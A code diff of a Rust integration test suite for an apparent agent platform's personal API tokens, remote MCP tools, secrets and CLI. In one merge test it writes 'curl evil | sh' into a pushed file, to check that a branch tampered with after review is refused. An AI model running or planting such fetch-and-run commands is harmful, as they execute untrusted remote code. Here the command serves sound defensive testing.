@@ -1,7 +1,8 @@
-//! Driving Yulius from a person's own agent (SPEC-247): personal API tokens with scopes, the
+//! Driving Yulius from a person's own agent: personal API tokens with scopes, the
 //! remote MCP on the public listener, and a laptop-only onboarding over it.
 
 use crate::support;
+use crate::support::eventually;
 
 use axum::http::{Method, StatusCode};
 use serde_json::{Value, json};
@@ -59,7 +60,7 @@ async fn audits(w: &World, target: &str) -> Result<Vec<(String, String, String)>
         .collect())
 }
 
-/// RMT-001..003: a token is made in the browser with a scope, shown once with the commands that
+/// A token is made in the browser with a scope, shown once with the commands that
 /// use it, listed with its last use, refused at once once revoked, and audited without itself.
 #[tokio::test]
 async fn tokens_are_made_in_the_browser_listed_and_revoked() -> TestResult {
@@ -184,7 +185,7 @@ async fn tokens_are_made_in_the_browser_listed_and_revoked() -> TestResult {
     Ok(())
 }
 
-/// RMT-002: a read-only token reads the REST API and changes nothing through it.
+/// A read-only token reads the REST API and changes nothing through it.
 #[tokio::test]
 async fn a_read_token_only_reads_the_rest_api() -> TestResult {
     let w = World::new("org").await?;
@@ -207,7 +208,7 @@ async fn a_read_token_only_reads_the_rest_api() -> TestResult {
     Ok(())
 }
 
-/// SPEC-247 RMT-001 (SPEC-483 A1): the scope of a token only narrows what its person may do,
+/// The scope of a token only narrows what its person may do,
 /// whatever the request's method. A writer's `read` token reads what view access allows and
 /// nothing a GET shows only to people who work there: the working tree (an ignored `.env` with
 /// copied secrets included), their shells, the previews, the Superagent's link and requests.
@@ -318,7 +319,7 @@ async fn served(w: &World, creds: &Creds) -> Result<Vec<String>, Error> {
         .collect())
 }
 
-/// RMT-010, RMT-011: the public `/mcp` serves personal `read` and `operate` tokens only; a read
+/// The public `/mcp` serves personal `read` and `operate` tokens only; a read
 /// token is served and runs only what reads.
 #[tokio::test]
 async fn the_public_mcp_takes_only_personal_agent_tokens() -> TestResult {
@@ -397,7 +398,7 @@ async fn the_public_mcp_takes_only_personal_agent_tokens() -> TestResult {
     assert!(error && said.contains("read-only"), "{said}");
     let (error, said, _) = remote(&w, &operate, "no_such_tool", json!({})).await?;
     assert!(error && said.contains("unknown tool"), "{said}");
-    // A project's shared browser is the Global Superagent's only (SPEC-437 SAB-002).
+    // A project's shared browser is the Global Superagent's only.
     assert!(!all.iter().any(|n| n.starts_with("browser_")), "{all:?}");
     let (error, said, _) = remote(
         &w,
@@ -410,7 +411,7 @@ async fn the_public_mcp_takes_only_personal_agent_tokens() -> TestResult {
     Ok(())
 }
 
-/// RMT-012, RMT-013, RMT-015: a project tool runs only with the person's access to that project
+/// A project tool runs only with the person's access to that project
 /// for its action; a project they cannot see is not found; changes are audited as the remote
 /// caller without their arguments.
 #[tokio::test]
@@ -500,7 +501,7 @@ async fn project_tools_follow_the_persons_access_and_are_audited() -> TestResult
     Ok(())
 }
 
-/// RMT-014: one token makes at most 120 requests a minute; another token is not slowed.
+/// One token makes at most 120 requests a minute; another token is not slowed.
 #[tokio::test]
 async fn a_token_is_limited_to_120_requests_a_minute() -> TestResult {
     let w = World::new("org").await?;
@@ -529,8 +530,8 @@ async fn a_token_is_limited_to_120_requests_a_minute() -> TestResult {
     Ok(())
 }
 
-/// RMT-020, RMT-021: a repository is listed, imported, described and its onboarding started with
-/// an operate token alone; a `yulius login` token still cannot start it (SPEC-051 OBD-002).
+/// A repository is listed, imported, described and its onboarding started with
+/// an operate token alone; a `yulius login` token still cannot start it.
 #[tokio::test]
 async fn a_repository_is_imported_and_onboarded_remotely() -> TestResult {
     let w = World::new("org").await?;
@@ -620,7 +621,7 @@ async fn a_repository_is_imported_and_onboarded_remotely() -> TestResult {
     Ok(())
 }
 
-/// SPEC-487 TCT-001, TCT-003, TCT-005: the person's own agent renames a task, orders the
+/// The person's own agent renames a task, orders the
 /// queue and acts on several tasks with the same tools their Superagent has, and a read token
 /// is served none of them.
 #[tokio::test]
@@ -704,7 +705,7 @@ async fn a_persons_agent_edits_orders_and_stops_tasks_remotely() -> TestResult {
     Ok(())
 }
 
-/// SPEC-487 TCT-005 (review round 1, F7): a bulk call a person's agent made goes on to its
+/// A bulk call a person's agent made goes on to its
 /// last task and its audit entry when the client goes away meanwhile (a client timeout during
 /// a long call), as the Superagent's does. The request is dropped as soon as the first task
 /// has the message; every task still gets it, and `remote.tool` records the call.
@@ -988,7 +989,7 @@ async fn a_named_browser_reply_keeps_the_park_selected_before_authorization() ->
     support::assert_replacement_parked(&w.h, &target.id).await
 }
 
-/// RMT-022, RMT-023: tasks are restarted, paused and followed, and CI and CD are read and run,
+/// Tasks are restarted, paused and followed, and CI and CD are read and run,
 /// through the functions of the web UI for the person.
 #[tokio::test]
 async fn tasks_ci_and_cd_are_driven_remotely() -> TestResult {
@@ -1087,63 +1088,9 @@ async fn tasks_ci_and_cd_are_driven_remotely() -> TestResult {
     Ok(())
 }
 
-/// GitHub's side of a repository for the fake GitHub: its bare remote, where merges land as
-/// GitHub lands them.
-struct Origin(std::path::PathBuf);
-
-impl support::FakeRemote for Origin {
-    fn branch_sha(&self, branch: &str) -> Option<String> {
-        support::repos::git(
-            &self.0,
-            &[
-                "rev-parse",
-                "--verify",
-                "--quiet",
-                &format!("refs/heads/{branch}"),
-            ],
-        )
-        .ok()
-        .map(|sha| sha.trim().to_owned())
-    }
-    fn merge(&self, base: &str, head: &str, method: &str, message: &str) -> Result<String, String> {
-        let base_sha = self.branch_sha(base).ok_or("base branch not found")?;
-        let tree = support::repos::git(&self.0, &["merge-tree", "--write-tree", &base_sha, head])?;
-        let tree = tree.trim().to_owned();
-        let mut args = vec!["commit-tree", tree.as_str(), "-p", base_sha.as_str()];
-        if method == "merge" {
-            args.extend(["-p", head]);
-        }
-        args.extend(["-m", message]);
-        let commit = support::repos::git(&self.0, &args)?.trim().to_owned();
-        support::repos::git(
-            &self.0,
-            &[
-                "update-ref",
-                &format!("refs/heads/{base}"),
-                &commit,
-                &base_sha,
-            ],
-        )?;
-        Ok(commit)
-    }
-    fn fast_forward(&self, _: &str, _: &str) -> Result<(), String> {
-        Err("not used".into())
-    }
-    fn delete_branch(&self, branch: &str) -> Result<bool, String> {
-        if self.branch_sha(branch).is_none() {
-            return Ok(false);
-        }
-        support::repos::git(
-            &self.0,
-            &["update-ref", "-d", &format!("refs/heads/{branch}")],
-        )
-        .map(|_| true)
-    }
-}
-
 /// `files` at `rev` of the bare `origin`, or `None`.
 fn origin_file(origin: &std::path::Path, rev: &str, path: &str) -> Option<String> {
-    support::repos::git(origin, &["show", &format!("{rev}:{path}")]).ok()
+    support::git_stdout(origin, &["show", &format!("{rev}:{path}")]).ok()
 }
 
 /// A project `Quartio-Studio/shop` imported remotely by alice (admin) with an operate token;
@@ -1155,7 +1102,7 @@ async fn imported_shop(
     let (_, _, alice) = person(w, "alice").await?;
     let origin = w.remote(support::repos::OWNER, "shop", files, &["dev"])?;
     w.h.github
-        .set_remote(std::sync::Arc::new(Origin(origin.clone())));
+        .set_remote(std::sync::Arc::new(support::BareRemote(origin.clone())));
     w.github
         .add_installation_repo(support::repos::OWNER, "shop", true);
     w.grant("alice", "shop", "admin");
@@ -1170,7 +1117,7 @@ async fn imported_shop(
     Ok((alice, origin))
 }
 
-/// RMT-024..026 (ADR-0189): files are read at the integration branch; a change is one commit of
+/// Files are read at the integration branch; a change is one commit of
 /// the person on a new change branch with a pull request, made away from the sandbox's clone; it
 /// merges only once Yulius CI passed at its head, and only change pull requests merge so.
 #[tokio::test]
@@ -1265,7 +1212,7 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
         Some("old\n"),
         "dev is untouched"
     );
-    let author = support::repos::git(&origin, &["log", "-1", "--format=%an <%ae>|%s", &branch])?;
+    let author = support::git_stdout(&origin, &["log", "-1", "--format=%an <%ae>|%s", &branch])?;
     assert!(
         author.starts_with("ALICE <")
             && author.contains("alice@users.noreply.github.com>|ci: run the tests"),
@@ -1338,7 +1285,9 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
         Some(toml)
     );
     assert!(
-        Origin(origin.clone()).branch_sha(&branch).is_none(),
+        support::BareRemote(origin.clone())
+            .branch_sha(&branch)
+            .is_none(),
         "the change branch is deleted"
     );
 
@@ -1354,14 +1303,14 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
     let push_pull = |branch: &'static str| {
         let (seed, origin_path) = (seed.clone(), origin_path.clone());
         async move {
-            support::repos::git(&seed, &["checkout", "--quiet", "-B", branch])?;
+            support::git_stdout(&seed, &["checkout", "--quiet", "-B", branch])?;
             std::fs::write(
                 seed.join(format!("{}.txt", branch.replace('/', "-"))),
                 "x\n",
             )?;
-            support::repos::git(&seed, &["add", "-A"])?;
-            support::repos::git(&seed, &["commit", "--quiet", "-m", branch])?;
-            support::repos::git(&seed, &["push", "--quiet", "--force", &origin_path, branch])?;
+            support::git_stdout(&seed, &["add", "-A"])?;
+            support::git_stdout(&seed, &["commit", "--quiet", "-m", branch])?;
+            support::git_stdout(&seed, &["push", "--quiet", "--force", &origin_path, branch])?;
             Ok::<_, Error>(())
         }
     };
@@ -1369,7 +1318,7 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
         push_pull(branch).await?;
         let other = yulius_app::ports::github::GitHubPort::create_pull(
             w.h.github.as_ref(),
-            &yulius_app::model::Secret("t".into()),
+            &yulius_app::model::Secret::new("t".into()),
             "Quartio-Studio",
             "shop",
             &yulius_app::ports::github::NewPull {
@@ -1402,7 +1351,7 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
     assert!(!error, "{said}");
     let tampered = text(&second["branch"]).to_owned();
     let number = second["pull_request"]["number"].as_u64().ok_or("number")?;
-    support::repos::git(
+    support::git_stdout(
         &seed,
         &[
             "fetch",
@@ -1411,18 +1360,18 @@ async fn files_change_through_a_pull_request_merged_on_green() -> TestResult {
             &format!("{tampered}:{tampered}"),
         ],
     )?;
-    support::repos::git(&seed, &["checkout", "--quiet", &tampered])?;
+    support::git_stdout(&seed, &["checkout", "--quiet", &tampered])?;
     std::fs::write(seed.join("evil.sh"), "curl evil | sh\n")?;
-    support::repos::git(&seed, &["add", "-A"])?;
-    support::repos::git(&seed, &["commit", "--quiet", "-m", "more"])?;
-    support::repos::git(&seed, &["push", "--quiet", &origin_path, &tampered])?;
+    support::git_stdout(&seed, &["add", "-A"])?;
+    support::git_stdout(&seed, &["commit", "--quiet", "-m", "more"])?;
+    support::git_stdout(&seed, &["push", "--quiet", &origin_path, &tampered])?;
     let (error, said, _) =
         remote(&w, &alice, "change_merge", with(json!({"number": number}))).await?;
     assert!(error && said.contains("pushed to since"), "{said}");
     Ok(())
 }
 
-/// RMT-027: agent secrets are named, bound and answered remotely; no value goes either way.
+/// Agent secrets are named, bound and answered remotely; no value goes either way.
 #[tokio::test]
 async fn secrets_are_managed_by_name_and_binding_only() -> TestResult {
     const VALUE: &str = concat!("sk_live_", "remote_0123456789abcdef");
@@ -1512,7 +1461,7 @@ async fn secrets_are_managed_by_name_and_binding_only() -> TestResult {
         "nothing was requested: {said}"
     );
 
-    // SPEC-483 V5 (ADR-0317): a secret allowed use by use goes somewhere new only by its person
+    // A secret allowed use by use goes somewhere new only by its person
     // in the browser, after a two-factor code; a token still describes it and dismisses.
     use yulius_app::ports::vault::VaultStore as _;
     let guarded = call(
@@ -1571,7 +1520,7 @@ async fn secrets_are_managed_by_name_and_binding_only() -> TestResult {
     Ok(())
 }
 
-/// SPEC-287 RSR-001..003 (#787): `secret_update` and `secret_hosts_answer` act on the secret of
+/// `secret_update` and `secret_hosts_answer` act on the secret of
 /// the name that wins for the project and the caller, as `secrets_list` shows it: the project's
 /// before the caller's personal one before a global one switched on; a shadowed secret, another
 /// person's personal one and a global one switched off are never reached by name.
@@ -1815,7 +1764,7 @@ async fn remote_secret_tools_act_on_the_secret_that_wins() -> TestResult {
     Ok(())
 }
 
-/// SPEC-274 PLW-004: the person's agent deletes a project's own agent secret by name with an
+/// The person's agent deletes a project's own agent secret by name with an
 /// operate token and the right the Secrets page needs; refused for a read token, a reader and a
 /// global secret; audited with the token and the name, never the value.
 #[tokio::test]
@@ -1946,7 +1895,7 @@ async fn yulius_cli(
     ))
 }
 
-/// RMT-030, RMT-031: the CLI stores a checked token apart from `yulius login`'s and calls the
+/// The CLI stores a checked token apart from `yulius login`'s and calls the
 /// same tools; a tool's refusal exits 1, a request that reached no tool exits 2.
 #[tokio::test]
 async fn the_cli_drives_the_remote_mcp_with_a_stored_token() -> TestResult {
@@ -2021,8 +1970,8 @@ async fn the_cli_drives_the_remote_mcp_with_a_stored_token() -> TestResult {
         "acme/shop",
         "--json",
     ];
-    // SPEC-620 CDM-001: Claude Code on Opus 5.5 by default, even with Codex usable too.
-    crate::codex::connect_codex(&w.h.app).await?;
+    // Claude Code on Opus 5.5 by default, even with Codex usable too.
+    crate::support::codex::connect_codex(&w.h.app).await?;
     let (code, out, err) = yulius_cli(home, &create, "").await?;
     assert_eq!(code, Some(0), "{out}{err}");
     let created: Value = serde_json::from_str(&out)?;
@@ -2114,7 +2063,7 @@ async fn the_cli_drives_the_remote_mcp_with_a_stored_token() -> TestResult {
     Ok(())
 }
 
-/// SPEC-274 PLW-005: `yulius secrets delete NAME` deletes the project's agent secret through
+/// `yulius secrets delete NAME` deletes the project's agent secret through
 /// `secret_delete` with the stored operate token; an unknown name is the tool's refusal (exit 1).
 #[tokio::test]
 async fn the_cli_deletes_an_agent_secret_by_name() -> TestResult {
@@ -2184,7 +2133,7 @@ async fn a_repository_is_onboarded_end_to_end_from_a_laptop() -> TestResult {
         &["dev"],
     )?;
     w.h.github
-        .set_remote(std::sync::Arc::new(Origin(origin.clone())));
+        .set_remote(std::sync::Arc::new(support::BareRemote(origin.clone())));
     w.github
         .add_installation_repo(support::repos::OWNER, "shop", true);
     w.grant("alice", "shop", "admin");
@@ -2323,7 +2272,7 @@ async fn a_repository_is_onboarded_end_to_end_from_a_laptop() -> TestResult {
     Ok(())
 }
 
-/// RMT-002: a read-only token opens no WebSocket. A terminal's socket is a GET that types into a
+/// A read-only token opens no WebSocket. A terminal's socket is a GET that types into a
 /// task, so the safe-method rule alone would let a read token write through it.
 #[tokio::test]
 async fn a_read_token_opens_no_websocket() -> TestResult {
@@ -2352,7 +2301,7 @@ async fn a_read_token_opens_no_websocket() -> TestResult {
     Ok(())
 }
 
-/// RMT-001: a revoked token ends at once, also where it was already in use: the open sockets'
+/// A revoked token ends at once, also where it was already in use: the open sockets'
 /// recheck refuses it (review finding 3).
 #[tokio::test]
 async fn a_revoked_token_no_longer_holds_its_open_connections() -> TestResult {
@@ -2419,7 +2368,7 @@ async fn only_the_browser_approves_a_cli_sign_in() -> TestResult {
     Ok(())
 }
 
-/// RMT-025: a change carries what it promises (files of 256 KiB, several of them), past the API's
+/// A change carries what it promises (files of 256 KiB, several of them), past the API's
 /// 1 MiB body limit for other requests (review finding 5).
 #[tokio::test]
 async fn a_change_of_several_large_files_fits_in_one_request() -> TestResult {
@@ -2485,7 +2434,7 @@ async fn a_change_of_several_large_files_fits_in_one_request() -> TestResult {
     Ok(())
 }
 
-/// RMT-015: every call of a tool that changes something is audited, refused ones too: by a
+/// Every call of a tool that changes something is audited, refused ones too: by a
 /// read-only token, or on a project that cannot be found (review finding 7). Without a project the
 /// entry's target is the token.
 #[tokio::test]
@@ -2632,7 +2581,7 @@ async fn a_repair_of_a_broken_integration_ci_waits_for_its_own_checks() -> TestR
     Ok(())
 }
 
-/// SPEC-504 review round 1: on a never-valid integration branch, a change that brings no valid
+/// On a never-valid integration branch, a change that brings no valid
 /// jobs of its own has nothing to test it, and its merge is refused saying so.
 #[tokio::test]
 async fn a_change_that_does_not_repair_a_never_valid_ci_is_refused() -> TestResult {
@@ -2709,22 +2658,6 @@ fn change_call(
     })
 }
 
-/// Waits (at most 60 s) until `done` holds.
-async fn eventually<F, Fut>(what: &str, mut done: F) -> TestResult
-where
-    F: FnMut() -> Fut,
-    Fut: std::future::Future<Output = Result<bool, Error>>,
-{
-    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
-    while !done().await? {
-        if std::time::Instant::now() > deadline {
-            return Err(format!("never: {what}").into());
-        }
-        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
-    }
-    Ok(())
-}
-
 /// RMT-015, RMT-025 (round-3 review): a change whose caller goes away mid-way still finishes:
 /// its pull request is opened and recorded, its scratch clone removed, and the call audited with
 /// its token.
@@ -2744,16 +2677,20 @@ async fn a_change_finishes_and_is_audited_when_its_caller_goes_away() -> TestRes
             .await?
             .ok_or("sandbox")?
             .id;
-    eventually("the call is audited", || async {
-        Ok(audits(&w, sid.as_str())
-            .await?
-            .iter()
-            .any(|(action, _, detail)| {
-                action == "remote.tool"
-                    && detail.contains("\"tool\":\"project_change\"")
-                    && detail.contains("\"ok\":true")
-            }))
-    })
+    eventually(
+        "the call is audited",
+        std::time::Duration::from_secs(60),
+        || async {
+            Ok(audits(&w, sid.as_str())
+                .await?
+                .iter()
+                .any(|(action, _, detail)| {
+                    action == "remote.tool"
+                        && detail.contains("\"tool\":\"project_change\"")
+                        && detail.contains("\"ok\":true")
+                }))
+        },
+    )
     .await?;
     assert!(
         w.h.github
@@ -2860,7 +2797,7 @@ async fn a_refused_pull_request_leaves_no_branch() -> TestResult {
     )
     .await?;
     assert!(error && said.contains("422"), "{said}");
-    let branches = support::repos::git(&origin, &["branch", "--list", "yulius/change-*"])?;
+    let branches = support::git_stdout(&origin, &["branch", "--list", "yulius/change-*"])?;
     assert_eq!(branches.trim(), "", "no change branch is left");
     // Audited once, as failed (round-3 review: the spawned task audits, the caller does not).
     let sid =
@@ -2896,7 +2833,7 @@ async fn agent_secrets(w: &World, sid: &str, creds: &Creds) -> Result<Vec<Value>
     Ok(listed.body.as_array().cloned().unwrap_or_default())
 }
 
-/// SPEC-256: with one token made for their agent, a person's laptop agent uploads the checkout,
+/// With one token made for their agent, a person's laptop agent uploads the checkout,
 /// moves the project's keys (a dotenv file and a key file, read by the CLI, never printed) into
 /// agent secrets already usable in `.env` files, and starts onboarding with its hand-over, which
 /// the onboarding task's request holds, redacted. Nothing waits for the person.
@@ -2931,12 +2868,12 @@ async fn a_laptop_project_is_onboarded_by_its_agent_alone() -> TestResult {
     assert_eq!(code, Some(0), "{out}{err}");
 
     // The laptop's checkout, cloned from GitHub.
-    support::repos::git(
+    support::git_stdout(
         home,
         &["clone", "--quiet", &origin.to_string_lossy(), "shop"],
     )?;
     let checkout = home.join("shop");
-    support::repos::git(
+    support::git_stdout(
         &checkout,
         &[
             "remote",
@@ -3138,7 +3075,7 @@ async fn a_laptop_project_is_onboarded_by_its_agent_alone() -> TestResult {
     Ok(())
 }
 
-/// SPEC-256 LOB-002: `--yes` needs the token made for the person's agent with `operate`: with a
+/// `--yes` needs the token made for the person's agent with `operate`: with a
 /// `yulius login` token or a read token nothing is sent.
 #[tokio::test]
 async fn an_unattended_import_needs_an_operate_token() -> TestResult {
@@ -3286,7 +3223,7 @@ async fn an_unattended_import_needs_an_operate_token() -> TestResult {
     Ok(())
 }
 
-/// SPEC-256 LOB-005, review round 1: the hand-over needs a usable Claude account before anything
+/// The hand-over needs a usable Claude account before anything
 /// is created; a retried start adds it once; a task that already tried to run is refused with
 /// what to do; blank notes on a started onboarding are no notes.
 #[tokio::test]
@@ -3401,7 +3338,7 @@ async fn a_hand_over_is_added_once_and_only_where_it_can_be_read() -> TestResult
     Ok(())
 }
 
-/// SPEC-256 LOB-005, review round 2: a start or skip landing between Start onboarding's read and
+/// A start or skip landing between Start onboarding's read and
 /// its start refuses the hand-over instead of dropping it unsaid.
 #[tokio::test(flavor = "multi_thread")]
 async fn a_hand_over_overtaken_by_another_start_is_refused() -> TestResult {
@@ -3646,7 +3583,7 @@ async fn a_laptops_operator_state_moves_into_the_sandbox_with_one_writer() -> Te
     .await?;
     assert_eq!(code, Some(1), "{err}");
 
-    // A read-only token of the same person never downloads it (review of SPEC-271, M4).
+    // A read-only token of the same person never downloads it (review of SPEC-271).
     let read = text(&make_token(&w, &browser, "reader", "read").await?["token"]).to_owned();
     let refused = call(
         &w.h.router,
@@ -3714,7 +3651,7 @@ async fn a_laptops_operator_state_moves_into_the_sandbox_with_one_writer() -> Te
     Ok(())
 }
 
-/// SPEC-275 AC1, AC2 (VAR-002, VAR-003, VAR-005): with only an operate token stored, the CLI sets
+/// With only an operate token stored, the CLI sets
 /// variables by argument and from a dotenv file, lists them in plain and deletes them; a name that
 /// is an agent secret or says it is a credential is refused and nothing of it is written; a read
 /// token lists but cannot set; every change is audited without its value.
@@ -3787,7 +3724,7 @@ async fn variables_are_set_from_a_laptop_and_listed_in_plain() -> TestResult {
         err.contains("SHOP_API_KEY") && err.contains("yulius secrets import"),
         "{err}"
     );
-    // Review round 1: a value that carries a credential is refused whatever its name, and a
+    // A value that carries a credential is refused whatever its name, and a
     // malformed argument is not echoed.
     let (code, out, err) = cli(vars(&["set", "DATABASE_URL=postgres://u:p4ss@db/app"])).await?;
     assert_eq!(code, Some(2), "{out}{err}");
@@ -3835,7 +3772,7 @@ async fn variables_are_set_from_a_laptop_and_listed_in_plain() -> TestResult {
     )
     .await?;
     assert!(!failed && shown.contains("OVH_ENDPOINT=ovh-ca"), "{shown}");
-    // VAR-008: secrets_list names the variables beside the secrets, values in plain.
+    // `secrets_list` names the variables beside the secrets, values in plain.
     let (failed, _, listed) =
         remote(&w, &reader, "secrets_list", json!({"project": "acme/shop"})).await?;
     assert!(!failed);
@@ -3886,7 +3823,7 @@ async fn variables_are_set_from_a_laptop_and_listed_in_plain() -> TestResult {
     Ok(())
 }
 
-/// SPEC-275 AC4 (VAR-006, VAR-007): `yulius secrets import --yes` of a company `.env` sends its
+/// `yulius secrets import --yes` of a company `.env` sends its
 /// keys as agent secrets and its plain values (a short region, a plain word, a base URL, an
 /// e-mail address) as project variables; a credential's name keeps its value a secret; with
 /// `--no-vars` nothing goes to variables.
@@ -4031,7 +3968,7 @@ async fn a_secrets_import_sends_plain_values_to_project_variables() -> TestResul
 /// gets instead of the request's own.
 type Redirect = (String, Option<String>, Option<String>);
 
-/// What an instance's old URL answers after a move (SPEC-460 MIG-041), or the instance itself
+/// What an instance's old URL answers after a move, or the instance itself
 /// before it: every request gets a 307 to the same path at `to` with `X-Yulius-Moved-To`.
 #[derive(Clone)]
 struct Address {
@@ -4100,7 +4037,7 @@ impl Address {
     }
 }
 
-/// SPEC-466 MVC-030 to MVC-032: after a move the CLI on a laptop follows the old URL's redirect:
+/// After a move the CLI on a laptop follows the old URL's redirect:
 /// the saved sign-in moves to the new URL, one line says so, the call is repeated once, and the
 /// old name keeps working. No other redirect is followed.
 #[tokio::test]
@@ -4212,7 +4149,7 @@ async fn the_cli_follows_an_instance_that_moved() -> TestResult {
     Ok(())
 }
 
-/// SPEC-466 MVC-031: an instance cannot make itself a name of another one. A move onto a URL
+/// An instance cannot make itself a name of another one. A move onto a URL
 /// where another sign-in is saved is not followed and changes nothing; onto one where the same
 /// sign-in is saved it is.
 #[tokio::test]
@@ -4281,7 +4218,7 @@ async fn the_cli_does_not_follow_a_move_onto_another_sign_in() -> TestResult {
     Ok(())
 }
 
-/// SPEC-466 MVC-032: a move that is undone after a laptop followed it. The CLI says where the
+/// A move that is undone after a laptop followed it. The CLI says where the
 /// sign-in came from when the new URL does not answer, and the saved token goes nowhere unless
 /// a person types it: a sign-in at the old URL without a token is refused as ever and contacts
 /// nobody; with the token the sign-in is back; with another token both sign-ins stay, and the
@@ -4425,7 +4362,7 @@ async fn the_cli_finds_its_way_back_after_a_move_that_was_undone() -> TestResult
     Ok(())
 }
 
-/// SPEC-483 slice 33 (QB7): every tool the remote MCP lists for a person's token is dispatched:
+/// Every tool the remote MCP lists for a person's token is dispatched:
 /// called with only its project, each answers (often refusing the missing arguments) and none is
 /// an "unknown tool", which a tool listed but missing from the shared dispatch would be. The
 /// Global Superagent's browser tools are not called: they would open a browser.
